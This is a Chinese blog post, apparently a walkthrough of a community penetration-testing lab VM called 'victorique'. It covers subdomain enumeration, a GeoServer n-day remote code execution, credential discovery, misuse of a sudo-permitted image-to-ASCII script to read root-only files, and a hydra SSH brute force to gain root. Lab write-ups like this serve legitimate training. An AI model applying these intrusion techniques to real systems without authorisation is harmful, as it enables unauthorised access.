@@ -1,0 +1,235 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>群友靶机之victorique | 再努力一点，她是不是就会回来</title><meta name="author" content="陈羽琳"><meta name="copyright" content="陈羽琳"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="123获取靶机地址：https:&#x2F;&#x2F;maze-sec.com&#x2F;qq群：660930334  配置：123456789101112靶机用VirtualBox制作，VMware导入可能网卡不兼容用户:todd 密码:qq6609303341. 启动虚拟机时按&#96;e&#96;键进入GRUB编辑模式2. 修改启动参数：将&#96;ro&#96;改为&#96;rw single init&#x3D;&#x2F;bin&#x2F;bash&#96;3. 按Ctrl+X启动进入单用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="群友靶机之victorique">
+<meta property="og:url" content="https://cyl-love.github.io/posts/47936.html">
+<meta property="og:site_name" content="再努力一点，她是不是就会回来">
+<meta property="og:description" content="123获取靶机地址：https:&#x2F;&#x2F;maze-sec.com&#x2F;qq群：660930334  配置：123456789101112靶机用VirtualBox制作，VMware导入可能网卡不兼容用户:todd 密码:qq6609303341. 启动虚拟机时按&#96;e&#96;键进入GRUB编辑模式2. 修改启动参数：将&#96;ro&#96;改为&#96;rw single init&#x3D;&#x2F;bin&#x2F;bash&#96;3. 按Ctrl+X启动进入单用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cyl-love.github.io/img/1.jpg">
+<meta property="article:published_time" content="2025-12-24T13:06:09.000Z">
+<meta property="article:modified_time" content="2025-12-24T13:13:47.665Z">
+<meta property="article:author" content="陈羽琳">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cyl-love.github.io/img/1.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "群友靶机之victorique",
+  "url": "https://cyl-love.github.io/posts/47936.html",
+  "image": "https://cyl-love.github.io/img/1.jpg",
+  "datePublished": "2025-12-24T13:06:09.000Z",
+  "dateModified": "2025-12-24T13:13:47.665Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "陈羽琳",
+      "url": "https://cyl-love.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/1.jpg"><link rel="canonical" href="https://cyl-love.github.io/posts/47936.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '群友靶机之victorique',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/2.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/2.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/1.jpg" alt="Logo"><span class="site-name">再努力一点，她是不是就会回来</span></a><a class="nav-page-title" href="/"><span class="site-name">群友靶机之victorique</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">群友靶机之victorique</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-12-24T13:06:09.000Z" title="发表于 2025-12-24 21:06:09">2025-12-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-12-24T13:13:47.665Z" title="更新于 2025-12-24 21:13:47">2025-12-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/">群友靶机</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">获取靶机地址：</span><br><span class="line">https://maze-sec.com/</span><br><span class="line">qq群：660930334</span><br></pre></td></tr></table></figure>
+
+<h1 id="配置："><a href="#配置：" class="headerlink" title="配置："></a>配置：</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">靶机用VirtualBox制作，VMware导入可能网卡不兼容</span><br><span class="line">用户:todd 密码:qq660930334</span><br><span class="line">1. 启动虚拟机时按`e`键进入GRUB编辑模式</span><br><span class="line">2. 修改启动参数：将`ro`改为`rw single init=/bin/bash`</span><br><span class="line">3. 按Ctrl+X启动进入单用户模式</span><br><span class="line">vim /etc/network/interfaces</span><br><span class="line">allow-hotplug ens33</span><br><span class="line">iface ens33 inet dhcp</span><br><span class="line"></span><br><span class="line">ip link set ens33 up</span><br><span class="line">dhclient ens33</span><br><span class="line">reboot -f</span><br></pre></td></tr></table></figure>
+
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p><img src="/../images/image-20251224145936670.png" alt="image-20251224145936670"></p>
+<h1 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br><span class="line">192.168.44.155 victorique.xyz</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20251224150220239.png" alt="image-20251224150220239"></p>
+<h1 id="域名枚举"><a href="#域名枚举" class="headerlink" title="域名枚举"></a>域名枚举</h1><p><img src="/../images/image-20251224150859292.png" alt="image-20251224150859292"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br><span class="line">192.168.44.155 victorique.xyz gifts.victorique.xyz</span><br></pre></td></tr></table></figure>
+
+<h1 id="服务探测"><a href="#服务探测" class="headerlink" title="服务探测"></a>服务探测</h1><h2 id="gifts-victorique-xyz"><a href="#gifts-victorique-xyz" class="headerlink" title="gifts.victorique.xyz"></a>gifts.victorique.xyz</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">给了账号和密码 ookami/GoS1Ck</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20251224151248676.png" alt="image-20251224151248676"></p>
+<h2 id="victorique-xyz"><a href="#victorique-xyz" class="headerlink" title="victorique.xyz"></a>victorique.xyz</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有登录页面，但是其他地方没什么交互了</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20251224151159760.png" alt="image-20251224151159760"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">拿了礼物给的账号和密码，提示被灰狼骗了，礼物在更深一层</span><br><span class="line">那就回去对gifts.victorique.xyz进行目录扫描</span><br><span class="line">拿到了死神弥一,但是没有别的东西，可能又是一个域名</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20251224152122459.png" alt="image-20251224152122459"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br><span class="line">192.168.44.155 victorique.xyz gifts.victorique.xyz </span><br><span class="line">Ka4zuyaKujo0.victorique.xyz</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20251224151956703.png" alt="image-20251224151956703"></p>
+<h2 id="Ka4zuyaKujo0-victorique-xyz"><a href="#Ka4zuyaKujo0-victorique-xyz" class="headerlink" title="Ka4zuyaKujo0.victorique.xyz"></a>Ka4zuyaKujo0.victorique.xyz</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现了一个geoserver当然是马不定蹄的看看有没有nday了</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20251224152341869.png" alt="image-20251224152341869"></p>
+<p><img src="/../images/image-20251224152404155.png" alt="image-20251224152404155"></p>
+<h1 id="nday利用"><a href="#nday利用" class="headerlink" title="nday利用"></a>nday利用</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">找到该服务存在的一个rce，尝试打poc注意靶机没有nc，要自己修改一下 跟之前一样用busybox就好了</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20251224152628832.png" alt="image-20251224152628832"></p>
+<p><img src="/../images/image-20251224153028810.png" alt="image-20251224153028810"></p>
+<p><img src="/../images/image-20251224154820067.png" alt="image-20251224154820067"></p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20251224155554189.png" alt="image-20251224155554189"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提示Found some useful fragments. Converted them into a visual representation.可视化片段拼凑在一起</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20251224160614748.png" alt="image-20251224160614748"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因为提示了可视化片段拼凑在一起，有很多图片但是图片要root权限才可以去读写，然后想要sudo -l去看看 但是呢没有密码啊 是直接打进来的 就到处翻翻文件和东西，最后在login.php找到了密码又是死神弥一，那我直接追番猜密码了(bushi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20251224181915574.png" alt="image-20251224181915574"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">victorique/shinigami_qujo</span><br></pre></td></tr></table></figure>
+
+<h1 id="再探测"><a href="#再探测" class="headerlink" title="再探测"></a>再探测</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh连接的shell好看一点，就不在反弹的shell上面弄了 一样的</span><br><span class="line">ssh victorique@192.168.44.155 </span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20251224182324273.png" alt="image-20251224182324273"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot;</span><br><span class="line">@author: Viet Nguyen &lt;nhviet1009@gmail.com&gt;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import argparse</span><br><span class="line"></span><br><span class="line">import cv2</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_args():</span><br><span class="line">    parser = argparse.ArgumentParser(&quot;Image to ASCII&quot;)</span><br><span class="line">    parser.add_argument(&quot;--input&quot;, type=str, default=&quot;data/input.jpg&quot;, help=&quot;Path to input image&quot;)</span><br><span class="line">    parser.add_argument(&quot;--output&quot;, type=str, default=&quot;data/output.txt&quot;, help=&quot;Path to output text file&quot;)</span><br><span class="line">    parser.add_argument(&quot;--mode&quot;, type=str, default=&quot;complex&quot;, choices=[&quot;simple&quot;, &quot;complex&quot;],</span><br><span class="line">                        help=&quot;10 or 70 different characters&quot;)</span><br><span class="line">    parser.add_argument(&quot;--num_cols&quot;, type=int, default=150, help=&quot;number of character for output&#x27;s width&quot;)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    return args</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main(opt):</span><br><span class="line">    if opt.mode == &quot;simple&quot;:</span><br><span class="line">        CHAR_LIST = &#x27;@%#*+=-:. &#x27;</span><br><span class="line">    else:</span><br><span class="line">        CHAR_LIST = &quot;$@B%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\|()1&#123;&#125;[]?-_+~&lt;&gt;i!lI;:,\&quot;^`&#x27;. &quot;</span><br><span class="line">    num_chars = len(CHAR_LIST)</span><br><span class="line">    num_cols = opt.num_cols</span><br><span class="line">    image = cv2.imread(opt.input)</span><br><span class="line">    image = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)</span><br><span class="line">    height, width = image.shape</span><br><span class="line">    cell_width = width / opt.num_cols</span><br><span class="line">    cell_height = 2 * cell_width</span><br><span class="line">    num_rows = int(height / cell_height)</span><br><span class="line">    if num_cols &gt; width or num_rows &gt; height:</span><br><span class="line">        print(&quot;Too many columns or rows. Use default setting&quot;)</span><br><span class="line">        cell_width = 6</span><br><span class="line">        cell_height = 12</span><br><span class="line">        num_cols = int(width / cell_width)</span><br><span class="line">        num_rows = int(height / cell_height)</span><br><span class="line"></span><br><span class="line">    output_file = open(opt.output, &#x27;w&#x27;)</span><br><span class="line">    for i in range(num_rows):</span><br><span class="line">        for j in range(num_cols):</span><br><span class="line">            output_file.write(</span><br><span class="line">                CHAR_LIST[min(int(np.mean(image[int(i * cell_height):min(int((i + 1) * cell_height), height),</span><br><span class="line">                                          int(j * cell_width):min(int((j + 1) * cell_width),</span><br><span class="line">                                                                  width)]) * num_chars / 255), num_chars - 1)])</span><br><span class="line">        output_file.write(&quot;\n&quot;)</span><br><span class="line">    output_file.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    opt = get_args()</span><br><span class="line">    main(opt)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20251224182532644.png" alt="image-20251224182532644"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这就可以把刚刚看到的root权限的png，读取出来 可以用output读取到www上面就可以直接看到是什么东西了 </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">那么问题来了要找的png在哪里呢 那就是隐藏文件而且还是png文件</span><br><span class="line">find . -type f -name &quot;.*.png&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20251224201831322.png" alt="image-20251224201831322"></p>
+<p><img src="/../images/image-20251224201835405.png" alt="image-20251224201835405"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后发现并不是这样的【只有png的】，给了大量的隐藏文件【全是番的角色图片】，而且不限于png这一中，所以还得重新找 find / -type f -name &quot;.*&quot; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">然后最后找到三段</span><br><span class="line">/usr/games/.haru.ppm</span><br><span class="line">/var/www/html/IoIooIIOIOio/sunset.webp</span><br><span class="line">/home/victorique/.kagura.png</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/python3 /opt/img2txt.py --output /var/www/html/test.txt --input /usr/games/.haru.ppm</span><br><span class="line"></span><br><span class="line">sudo /usr/bin/python3 /opt/img2txt.py --output /var/www/html/test.txt --input /var/www/html/IoIooIIOIOio/sunset.webp</span><br><span class="line"></span><br><span class="line">sudo /usr/bin/python3 /opt/img2txt.py --output /var/www/html/test.txt --input /etc/ssh/.shinigami.png</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20251224203241487.png" alt="image-20251224203241487"></p>
+<p><img src="/../images/image-20251224203257100.png" alt="image-20251224203257100"></p>
+<p><img src="/../images/image-20251224203441851.png" alt="image-20251224203441851"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">将获得的三段字符自由排列组合</span><br><span class="line">C11pp3r510n5h1pch4mp</span><br><span class="line">C11pp3r5ch4mp10n5h1p</span><br><span class="line">10n5h1pC11pp3r5ch4mp</span><br><span class="line">10n5h1pch4mpC11pp3r5</span><br><span class="line">ch4mpC11pp3r510n5h1p</span><br><span class="line">ch4mp10n5h1pC11pp3r5</span><br><span class="line">hydra -l root -P passwd.txt 192.168.44.155 ssh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20251224204053238.png" alt="image-20251224204053238"></p>
+<h1 id="权限再提升"><a href="#权限再提升" class="headerlink" title="权限再提升"></a>权限再提升</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root/C11pp3r5ch4mp10n5h1p</span><br><span class="line">ssh root@192.168.44.155</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20251224204237075.png" alt="image-20251224204237075"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">发现依旧是一张图片，可以直接下载下来，也可以依旧用脚本映射到test.txt上面，一样的道理</span><br><span class="line"></span><br><span class="line">sudo /usr/bin/python3 /opt/img2txt.py --output /var/www/html/test.txt --input /root/root.png</span><br><span class="line"></span><br><span class="line">但是可能映射出来的不是那么好看我就直接下载下来了</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/_root_root.png" alt="_root_root"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://cyl-love.github.io">陈羽琳</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://cyl-love.github.io/posts/47936.html">https://cyl-love.github.io/posts/47936.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://cyl-love.github.io" target="_blank">再努力一点，她是不是就会回来</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></div><div class="post-share"><div class="social-share" data-image="/img/1.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/60187.html" title="群友靶机之Vimer"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">群友靶机之Vimer</div></div><div class="info-2"><div class="info-item-1">123获取靶机地址：https://maze-sec.com/qq群：660930334  配置：123456789101112靶机用VirtualBox制作，VMware导入可能网卡不兼容用户:todd 密码:qq6609303341. 启动虚拟机时按`e`键进入GRUB编辑模式2. 修改启动参数：将`ro`改为`rw single init=/bin/bash`3. 按Ctrl+X启动进入单用户模式vim /etc/network/interfacesallow-hotplug ens33iface ens33 inet dhcpip link set ens33 updhclient ens33reboot -f  端口扫描 122,80,113端口，113端口泄露了vim用户名，先尝试爆破ssh，再去看看80端口  80端口探测  1是一个vim，没有什么特别的东西  爆破获得用户账号密码12hydra -l vim -P /usr/share/wordlists/rockyou.txt 192.168.44.151 sshvim/000001  ssh连接1ssh vi...</div></div></div></a><a class="pagination-related" href="/posts/32329.html" title="群友靶机之Regex"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">群友靶机之Regex</div></div><div class="info-2"><div class="info-item-1">123获取靶机地址：https://maze-sec.com/qq群：660930334  配置：123456789101112靶机用VirtualBox制作，VMware导入可能网卡不兼容用户:todd 密码:qq6609303341. 启动虚拟机时按`e`键进入GRUB编辑模式2. 修改启动参数：将`ro`改为`rw single init=/bin/bash`3. 按Ctrl+X启动进入单用户模式vim /etc/network/interfacesallow-hotplug ens33iface ens33 inet dhcpip link set ens33 updhclient ens33reboot -f  端口扫描 122,80,5000端口，80端口什么都没有，切入点应该在5000端口上了  服务探测 1进来是一个邮箱验证，目录扫描也没有什么tips点上，常规查看源码发现有一个被注释掉了的邮箱地址，看看有什么用先   1只是单纯的返回了邮箱验证正确，搜regax存在个redos攻击，那么可能验证的邮箱是用的正则匹配，可能存在redos攻击获得报错信息，刚好获得一...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/posts/63247.html" title="群友靶机之5ud0"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-24</div><div class="info-item-2">群友靶机之5ud0</div></div><div class="info-2"><div class="info-item-1">123获取靶机地址：https://maze-sec.com/qq群：660930334  配置：123456789101112靶机用VirtualBox制作，VMware导入可能网卡不兼容用户:todd 